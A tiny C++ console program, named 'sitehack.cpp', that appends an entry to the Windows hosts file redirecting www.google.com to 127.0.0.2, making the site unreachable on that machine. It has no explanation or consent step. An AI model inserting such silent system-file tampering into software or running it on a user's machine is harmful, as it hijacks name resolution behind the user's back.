// sitehack.cpp : Defines the entry point for the console application.
//

#include <stdio.h>
#include <fstream>


int main(int argc, char* argv[])
{
	std::ofstream outfile;

	outfile.open("C:\\Windows\\System32\\drivers\\etc\\hosts", std::ios_base::app);
	outfile << "\n127.0.0.2 www.google.com";
	
	return 0;
}

